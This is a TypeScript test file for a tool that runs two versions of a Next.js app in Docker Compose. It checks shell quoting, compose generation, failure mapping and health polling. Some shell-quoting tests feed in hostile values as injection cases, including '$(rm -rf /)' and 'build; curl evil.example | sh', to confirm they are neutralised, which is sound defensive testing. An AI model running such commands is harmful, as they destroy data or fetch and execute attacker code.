import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';

import { buildAppScript, SETUP_EXIT_CODES, shellQuote } from './app-script.js';
import {
  buildComposeSpec,
  DEFAULT_CONTAINER_LIMITS,
  renderCompose,
  serviceUrl,
} from './compose-spec.js';
import { containerSeconds, createComposeProject, parsePs } from './docker-compose.js';
import { waitUntilHealthy } from './health.js';
import type { HealthTarget } from './health.js';
import { setupFailure, setupTimeout, tailLines } from './setup-failure.js';
import type { Recipe } from '../domain/recipe.js';
import { FakeClock } from '../testing/fake-clock.js';
import { FakeExec } from '../testing/fake-exec.js';
import { FakeHttp } from '../testing/fake-http.js';
import { STUB_RECIPE } from '../testing/stub-stages.js';

const recipe = (overrides: Partial<Recipe> = {}): Recipe => ({ ...STUB_RECIPE, ...overrides });
const RUN_ID = '01k6t3y8k0g3m5x9a2b7c4d6ef';

describe('shellQuote', () => {
  it.each([
    ['pnpm', 'pnpm'],
    ['--frozen-lockfile', '--frozen-lockfile'],
    ['0.0.0.0', '0.0.0.0'],
    ['a b', "'a b'"],
    ["it's", "'it'\"'\"'s'"],
    ['$(rm -rf /)', "'$(rm -rf /)'"],
    ['`id`; echo', "'`id`; echo'"],
    ['', "''"],
  ])('quotes %j as %j', (arg, expected) => {
    expect(shellQuote(arg)).toBe(expected);
  });
});

describe('buildAppScript', () => {
  it('runs toolchain, install, build and start in order, with phase exit codes', () => {
    const script = buildAppScript(recipe());

    expect(script.split('\n')).toEqual([
      'set -u',
      'cd /app || exit 100',
      "echo '@@bdiff phase toolchain'",
      'corepack --version >/dev/null 2>&1 || npm install --global corepack >/dev/null 2>&1 || exit 100',
      'corepack enable || exit 100',
      'pnpm config set --location=global dangerously-allow-all-builds true >/dev/null 2>&1 || true',
      "echo '@@bdiff phase install'",
      'pnpm install --frozen-lockfile || exit 101',
      'cd /app || exit 101',
      "echo '@@bdiff phase build'",
      'pnpm run build || exit 103',
      "echo '@@bdiff phase start'",
      'exec pnpm exec next start -p 3000 -H 0.0.0.0',
      '',
    ]);
  });

  it('installs at the install root, then runs database setup and the app in the app root', () => {
    const script = buildAppScript(
      recipe({
        installRoot: '.',
        appRoot: 'apps/web',
        packageManager: { name: 'npm' },
        installCmd: ['npm', 'ci'],
        dbSetupCmds: [['npm', 'exec', '--', 'prisma', 'migrate', 'deploy']],
      }),
    );

    expect(script).toContain('cd /app/apps/web || exit 101');
    expect(script).toContain(
      "echo '@@bdiff phase db'\nnpm exec -- prisma migrate deploy || exit 102",
    );
    expect(script).not.toContain('dangerously-allow-all-builds');
    expect(script.indexOf('npm ci')).toBeLessThan(script.indexOf('prisma migrate'));
  });

  it('quotes hostile recipe arguments so the shell never interprets them', () => {
    const script = buildAppScript(
      recipe({ buildCmd: ['pnpm', 'run', 'build; curl evil.example | sh'] }),
    );

    expect(script).toContain("pnpm run 'build; curl evil.example | sh' || exit 103");
  });
});

describe('buildComposeSpec / renderCompose', () => {
  const spec = (r: Recipe) =>
    buildComposeSpec(r, { runId: RUN_ID, limits: DEFAULT_CONTAINER_LIMITS });
  const services = (r: Recipe) =>
    (spec(r) as { services: Record<string, Record<string, unknown>> }).services;

  it('names the project after the run and configures both sides identically', () => {
    const all = services(
      recipe({ env: { NEXT_PUBLIC_NAME: { value: 'Shop', source: 'example' } } }),
    );
    const { 'app-base': base, 'app-head': head } = all;

    expect(spec(recipe()).name).toBe(`bdiff-${RUN_ID}`);
    expect(Object.keys(all)).toEqual(['app-base', 'app-head']);
    expect({ ...base, labels: undefined }).toEqual({ ...head, labels: undefined });
    expect(base).toMatchObject({
      image: 'node:22',
      ports: ['127.0.0.1::3000'],
      cpus: 2,
      mem_limit: '4g',
      init: true,
      pids_limit: 4096,
      security_opt: ['no-new-privileges:true'],
      labels: { 'dev.bdiff.run': RUN_ID, 'dev.bdiff.side': 'base' },
      environment: {
        TZ: 'UTC',
        LANG: 'C.UTF-8',
        NODE_ENV: 'production',
        NEXT_TELEMETRY_DISABLED: '1',
        CI: '1',
        PORT: '3000',
        HOSTNAME: '0.0.0.0',
        NEXT_PUBLIC_NAME: 'Shop',
      },
    });
    expect(base).not.toHaveProperty('volumes');
    expect(base).not.toHaveProperty('privileged');
  });

  it('gives each side its own database and points the app at it', () => {
    const all = services(
      recipe({
        services: [
          { kind: 'postgres', version: '15', envVar: 'DATABASE_URL' },
          { kind: 'redis', version: '7', envVar: 'REDIS_URL' },
        ],
      }),
    );

    expect(Object.keys(all).sort()).toEqual([
      'app-base',
      'app-head',
      'db-base',
      'db-head',
      'redis-base',
      'redis-head',
    ]);
    expect(all['db-head']).toMatchObject({
      image: 'postgres:15',
      cpus: 1,
      mem_limit: '1g',
      healthcheck: expect.any(Object) as object,
    });
    expect(all['app-head']).toMatchObject({
      environment: {
        DATABASE_URL: 'postgresql://bdiff:bdiff@db-head:5432/bdiff',
        REDIS_URL: 'redis://redis-head:6379',
      },
      depends_on: {
        'db-head': { condition: 'service_healthy' },
        'redis-head': { condition: 'service_healthy' },
      },
    });
    expect(serviceUrl({ kind: 'postgres', version: '16', envVar: 'X' }, 'base')).toContain(
      '@db-base:',
    );
  });

  it('escapes every $ so compose never interpolates untrusted values', () => {
    const yaml = renderCompose(
      spec(recipe({ env: { SECRET: { value: 'a$b${HOME}$$c', source: 'example' } } })),
    );
    const parsed = parse(yaml) as {
      services: Record<string, { environment: Record<string, string>; command: string[] }>;
    };

    expect(parsed.services['app-base']?.environment.SECRET).toBe('a$$b$${HOME}$$$$c');
    expect(yaml).not.toMatch(/[^$]\$\{HOME\}/);
  });
});

describe('setupFailure / setupTimeout', () => {
  const log = Array.from({ length: 150 }, (_, index) => `line ${String(index + 1)}`).join('\n');

  it.each([
    [SETUP_EXIT_CODES.toolchain, 'SETUP_INSTALL_FAILED'],
    [SETUP_EXIT_CODES.install, 'SETUP_INSTALL_FAILED'],
    [SETUP_EXIT_CODES.db, 'SETUP_DB_FAILED'],
    [SETUP_EXIT_CODES.build, 'SETUP_BUILD_FAILED'],
    [1, 'SETUP_START_FAILED'],
    [0, 'SETUP_START_FAILED'],
    [137, 'SETUP_START_FAILED'],
  ])('maps exit code %i to %s', (exitCode, code) => {
    expect(setupFailure('head', exitCode, log)).toMatchObject({
      code,
      details: { side: 'head', exitCode },
    });
  });

  it('keeps the last 100 log lines', () => {
    const tail = setupFailure('head', 103, log).details.logTail;

    expect(tail).toHaveLength(100);
    expect(Array.isArray(tail) && tail[0]).toBe('line 51');
    expect(Array.isArray(tail) && tail.at(-1)).toBe('line 150');
  });

  it('reports a health timeout', () => {
    expect(setupTimeout('base', 600_000, 'waiting')).toMatchObject({
      code: 'SETUP_TIMEOUT',
      message: 'base: app was not healthy within 600 s',
      details: { logTail: ['waiting'] },
    });
  });

  it('drops blank lines from the tail', () => {
    expect(tailLines('a\n\n  \nb\n', 5)).toEqual(['a', 'b']);
  });
});

describe('parsePs / containerSeconds', () => {
  it('parses both JSON array and line-delimited output', () => {
    const entry = { Service: 'app-base', State: 'running', ExitCode: 0, Name: 'x' };

    expect(parsePs(JSON.stringify([entry]))).toEqual([entry]);
    expect(
      parsePs(
        `${JSON.stringify(entry)}\n${JSON.stringify({ ...entry, Service: 'app-head', State: 'exited', ExitCode: 103 })}`,
      ),
    ).toHaveLength(2);
    expect(parsePs('')).toEqual([]);
  });

  it('computes container run time', () => {
    const now = new Date('2026-01-01T00:10:00Z');

    expect(containerSeconds('2026-01-01T00:00:00Z 2026-01-01T00:02:30Z false', now)).toBe(150);
    expect(containerSeconds('2026-01-01T00:05:00Z 0001-01-01T00:00:00Z true', now)).toBe(300);
    expect(containerSeconds('0001-01-01T00:00:00Z 0001-01-01T00:00:00Z false', now)).toBe(0);
  });
});

describe('createComposeProject', () => {
  it('removes the project by name, without needing the compose file', async () => {
    const exec = new FakeExec().on({ cmd: 'docker' }, {});
    const signal = new AbortController().signal;

    await createComposeProject(exec, '/gone/compose.yml', 'bdiff-x', signal).down(signal);

    expect(exec.calls[0]?.args).toEqual([
      'compose',
      '--project-name',
      'bdiff-x',
      'down',
      '--volumes',
      '--remove-orphans',
      '--timeout',
      '5',
    ]);
  });

  it('fails cleanup with CLEANUP_FAILED when removal fails', async () => {
    const exec = new FakeExec().on({ cmd: 'docker' }, { exitCode: 1, stderr: 'daemon gone' });
    const signal = new AbortController().signal;

    await expect(
      createComposeProject(exec, 'c.yml', 'bdiff-x', signal).down(signal),
    ).rejects.toMatchObject({
      code: 'CLEANUP_FAILED',
    });
  });
});

describe('waitUntilHealthy', () => {
  const options = (clock: FakeClock, http: FakeHttp) => ({
    clock,
    http,
    signal: new AbortController().signal,
    timeoutMs: 10_000,
    intervalMs: 1_000,
    requestTimeoutMs: 500,
  });
  const target = (
    side: 'base' | 'head',
    exitCodes: (number | undefined)[] = [undefined],
  ): HealthTarget => ({
    side,
    url: `http://${side}/health`,
    exitCode: () => Promise.resolve(exitCodes.length > 1 ? exitCodes.shift() : exitCodes[0]),
  });
  /** Advances the fake clock whenever the poller sleeps, until `promise` settles. */
  async function drive<T>(clock: FakeClock, promise: Promise<T>): Promise<T> {
    const state = { settled: false };
    const markSettled = () => {
      state.settled = true;
    };
    promise.then(markSettled, markSettled);
    while (!state.settled) {
      await new Promise((resolve) => setImmediate(resolve));
      if (clock.pendingSleeps > 0) {
        clock.advance(1_000);
      }
    }
    return promise;
  }

  it('waits until both sides answer 2xx', async () => {
    const clock = new FakeClock();
    const http = new FakeHttp()
      .on('http://base/health', 'refused', 'refused', 200)
      .on('http://head/health', 503, 200);

    const outcome = await drive(
      clock,
      waitUntilHealthy([target('base'), target('head')], options(clock, http)),
    );

    expect(outcome).toEqual({ kind: 'healthy' });
    expect(http.requests.filter((url) => url === 'http://base/health')).toHaveLength(3);
  });

  it('reports each side once, as soon as it first answers', async () => {
    const clock = new FakeClock();
    const http = new FakeHttp()
      .on('http://base/health', 'refused', 'refused', 200)
      .on('http://head/health', 200);
    const healthy: string[] = [];

    await drive(
      clock,
      waitUntilHealthy([target('base'), target('head')], {
        ...options(clock, http),
        onHealthy: (side) => healthy.push(side),
      }),
    );

    expect(healthy).toEqual(['head', 'base']);
  });

  it('reports an exited container immediately, without waiting for the timeout', async () => {
    const clock = new FakeClock();
    const http = new FakeHttp().on('http://base/health', 'refused');

    const outcome = await drive(
      clock,
      waitUntilHealthy([target('base'), target('head', [undefined, 103])], options(clock, http)),
    );

    expect(outcome).toEqual({ kind: 'exited', side: 'head', exitCode: 103 });
    expect(clock.monotonicMs()).toBeLessThan(10_000);
  });

  it('times out when an app never becomes healthy', async () => {
    const clock = new FakeClock();
    const http = new FakeHttp().on('http://base/health', 200).on('http://head/health', 'refused');

    const outcome = await drive(
      clock,
      waitUntilHealthy([target('base'), target('head')], options(clock, http)),
    );

    expect(outcome).toEqual({ kind: 'timeout', side: 'head' });
    expect(clock.monotonicMs()).toBe(10_000);
  });

  it('stops when the run aborts', async () => {
    const clock = new FakeClock();
    const controller = new AbortController();
    const http = new FakeHttp().on('http://base/health', 'refused');
    const waiting = waitUntilHealthy([target('base')], {
      ...options(clock, http),
      signal: controller.signal,
    });

    controller.abort();

    await expect(waiting).rejects.toMatchObject({ code: 'ABORTED' });
  });
});
